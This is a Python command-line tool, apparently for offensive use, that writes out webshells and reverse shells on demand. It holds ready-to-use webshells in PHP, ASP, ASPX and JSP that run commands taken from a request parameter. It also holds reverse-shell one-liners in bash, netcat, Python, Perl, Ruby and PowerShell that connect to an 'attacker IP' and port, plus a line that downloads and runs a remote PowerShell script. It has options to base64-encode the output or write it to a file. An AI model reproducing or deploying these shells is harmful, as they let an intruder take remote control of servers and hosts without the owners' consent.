#!/usr/bin/env python3
"""Shell Generator - Drop webshells and reverse shells"""
import sys
import base64
import argparse

WEBSHELLS = {
    "php": """<?php system($_GET['cmd']); ?>""",
    "php5": """<?php system($_GET['cmd']); ?>""",
    "phtml": """<?php system($_GET['cmd']); ?>""",
    "asp": """<%eval request("cmd")%>""",
    "aspx": """<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd());%>""",
    "jsp": """<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>""",
    "jspx": """<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter("cmd"));</jsp:scriptlet>""",
    "war": """<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>""",
}

REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc": "nc -e /bin/bash {ip} {port}",
    "nc_openbsd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
    "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=[text.encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    "cmd": "cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')",
}

def generate_webshell(lang, output=None):
    if lang not in WEBSHELLS:
        print(f"[!] Available: {', '.join(WEBSHELLS.keys())}")
        return
    shell = WEBSHELLS[lang]
    if output:
        with open(output, 'w') as f:
            f.write(shell)
        print(f"[+] Webshell written to {output}")
    else:
        print(shell)

def generate_reverse(shell_type, ip, port, encode=False, output=None):
    if shell_type not in REVERSE_SHELLS:
        print(f"[!] Available: {', '.join(REVERSE_SHELLS.keys())}")
        return
    shell = REVERSE_SHELLS[shell_type].format(ip=ip, port=port)
    if encode:
        shell = base64.b64encode(shell.encode()).decode()
        print(f"[+] Base64 encoded:")
    if output:
        with open(output, 'w') as f:
            f.write(shell)
        print(f"[+] Reverse shell written to {output}")
    else:
        print(shell)

def main():
    parser = argparse.ArgumentParser(description="Shell Generator")
    parser.add_argument("type", choices=["webshell", "reverse"], help="Shell type")
    parser.add_argument("--lang", help="Language (php, asp, jsp, etc.)")
    parser.add_argument("--shell", help="Shell type (bash, python, powershell, etc.)")
    parser.add_argument("--ip", help="Attacker IP")
    parser.add_argument("--port", help="Attacker port")
    parser.add_argument("--encode", action="store_true", help="Base64 encode")
    parser.add_argument("--output", "-o", help="Output file")
    args = parser.parse_args()

    if args.type == "webshell":
        generate_webshell(args.lang, args.output)
    elif args.type == "reverse":
        if not args.ip or not args.port:
            print("[!] --ip and --port required for reverse shell")
            sys.exit(1)
        generate_reverse(args.shell, args.ip, args.port, args.encode, args.output)

if __name__ == "__main__":
    main()
